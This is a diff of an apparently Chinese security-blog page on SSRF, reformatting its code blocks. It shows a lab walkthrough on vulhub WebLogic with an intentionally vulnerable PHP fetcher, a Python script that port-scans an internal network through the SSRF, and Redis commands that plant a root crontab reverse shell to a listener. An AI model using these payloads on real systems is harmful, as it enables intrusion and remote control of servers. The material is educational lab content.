@@ -471,12 +471,22 @@
 <p>12.从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</p>
 <h1 id="0x03-漏洞验证"><a href="#0x03-漏洞验证" class="headerlink" title="0x03 漏洞验证"></a>0x03 漏洞验证</h1><p>1、因为SSRF漏洞是构造服务器发送请求的安全漏洞，所以我们可以通过抓包分析发送的请求是否是由服务器端发送的来判断是否存在SSRF漏洞</p>
 <p>2、在页面源码中查找访问的资源地址，如果该资源地址类型为下面这种样式则可能存在SSRF漏洞</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.xxx.com&#x2F;a.php?image&#x3D;(地址)</span><br></pre></td></tr></table></figure>
-
+<pre><code>http://www.xxx.com/a.php?image=(地址)</code></pre>
 <h1 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h1><h2 id="1、一个简单的测试靶场"><a href="#1、一个简单的测试靶场" class="headerlink" title="1、一个简单的测试靶场"></a>1、一个简单的测试靶场</h2><p>测试PHP代码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$ch</span> = curl_init();</span><br><span class="line">	curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">	curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">	curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">	curl_close(<span class="variable">$ch</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">curl(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+function curl($url)&#123;
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_HEADER, 0);
+    curl_exec($ch);
+    curl_close($ch);
+&#125;
+
+$url = $_GET[&#39;url&#39;];
+curl($url);
+?&gt;</code></pre>
 <p>利用phpstudy或者宝塔搭建好靶场后，访问自己的url地址。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.38.132&#x2F;ssrf.php?url&#x3D;teamssix.com</span><br></pre></td></tr></table></figure>
+<pre><code>http://192.168.38.132/ssrf.php?url=teamssix.com</code></pre>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF2.png"></p>
 <p>如果服务器有其他服务只能本地访问，比如phpmyadmin，则可以构造ssrf.php?url=127.0.0.1、phpmyadmin进行访问，接下来看看利用SSRF扫描目标主机端口</p>
 <p>打开Burp，抓包发到Intruder，设置Payload位置</p>
@@ -498,14 +508,37 @@
 <p>这时靶机返回信息提示连接不到服务，通过上面的两步测试可以判断出该目标是存在SSRF漏洞的。</p>
 <h3 id="2、通过Redis服务反弹shell"><a href="#2、通过Redis服务反弹shell" class="headerlink" title="2、通过Redis服务反弹shell"></a>2、通过Redis服务反弹shell</h3><p>既然想通过Redis服务反弹Shell，就需要先知道Redis服务的内网IP，这里因为是本地环境，内网IP就直接查看了，如果公网的话就要看前期信息收集怎么样了，当然爆破IP也是可以的。</p>
 <p>进入 redis服务 的shell，查看内网IP</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">:~&#x2F;vulhub&#x2F;weblogic&#x2F;ssrf# docker exec -it ssrf_redis_1 bash</span><br><span class="line">[root@5d9f91f455b6 &#x2F;]# ifconfig</span><br><span class="line">eth0      Link encap:Ethernet  HWaddr 02:42:AC:12:00:02  </span><br><span class="line">          inet addr:172.18.0.2  Bcast:172.18.255.255  Mask:255.255.0.0</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:129 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:13176 (12.8 KiB)  TX bytes:0 (0.0 b)</span><br></pre></td></tr></table></figure>
+<pre><code>:~/vulhub/weblogic/ssrf# docker exec -it ssrf_redis_1 bash
+[root@5d9f91f455b6 /]# ifconfig
+eth0      Link encap:Ethernet  HWaddr 02:42:AC:12:00:02  
+          inet addr:172.18.0.2  Bcast:172.18.255.255  Mask:255.255.0.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:129 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:13176 (12.8 KiB)  TX bytes:0 (0.0 b)</code></pre>
 <p>知道内网IP后，就能扫描端口了，下面是我写的一个小脚本，当然用Burp也是可以的</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://192.168.38.134:7001/uddiexplorer/SearchPublicRegistries.jsp?&#x27;</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">65535</span>):</span><br><span class="line">	data = <span class="string">&#x27;operator=http://172.18.0.2:&#123;&#125;&amp;rdoSearch=name&amp;txtSearchname=teamsix&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&#x27;</span>.<span class="built_in">format</span>(port)</span><br><span class="line">	r = requests.post(url,headers=headers,data=data)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&#x27;Tried all&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">		print(<span class="string">&#x27;\n\n[+] &#123;&#125; 发现端口\n\n&#x27;</span>.<span class="built_in">format</span>(port))</span><br></pre></td></tr></table></figure>
+<pre><code class="python">import requests
+url = &#39;http://192.168.38.134:7001/uddiexplorer/SearchPublicRegistries.jsp?&#39;
+headers = &#123;&#39;Content-Type&#39;:&#39;application/x-www-form-urlencoded&#39;&#125;
+for port in range(1,65535):
+    data = &#39;operator=http://172.18.0.2:&#123;&#125;&amp;rdoSearch=name&amp;txtSearchname=teamsix&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&#39;.format(port)
+    r = requests.post(url,headers=headers,data=data)
+    if &#39;Tried all&#39; not in r.text:
+        print(&#39;\n\n[+] &#123;&#125; 发现端口\n\n&#39;.format(port))</code></pre>
 <p>执行脚本</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~# python3 ssrf_portscan.py</span><br><span class="line">[+] 6379 发现端口</span><br></pre></td></tr></table></figure>
+<pre><code>~# python3 ssrf_portscan.py
+[+] 6379 发现端口</code></pre>
 <p>通过扫描发现Redis服务的默认端口6373是开放的。</p>
 <p>接下来使用Burp写入shell，注意下面的IP地址为自己nc监听的地址</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;172.18.0.2:6379&#x2F;test</span><br><span class="line"></span><br><span class="line">set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.10.30&#x2F;4444 0&gt;&amp;1\n\n\n\n&quot;</span><br><span class="line">config set dir &#x2F;etc&#x2F;</span><br><span class="line">config set dbfilename crontab</span><br><span class="line">save</span><br><span class="line"></span><br><span class="line">aaa</span><br></pre></td></tr></table></figure>
+<pre><code>http://172.18.0.2:6379/test
+
+set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.10.30/4444 0&gt;&amp;1\n\n\n\n&quot;
+config set dir /etc/
+config set dbfilename crontab
+save
+
+aaa</code></pre>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/SSRF10.png"></p>
 <p>如果使用 Burp 的话，直接把那几行代码复制到 operator 参数后面就行，就不用URL编码了。</p>
 <p>如果反弹不回 Shell ，在确定各个 IP、端口等参数都没有问题的情况下，Burp 里多点几次几次发送就可以了，我有时候都需要点个几十次才能反弹 Shell ，感觉有些情况下反弹 Shell 是个比较玄学的东西。</p>
@@ -963,7 +996,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">115.1k</span>&nbsp;字
+                class="white-color">114.7k</span>&nbsp;字
             
             
             
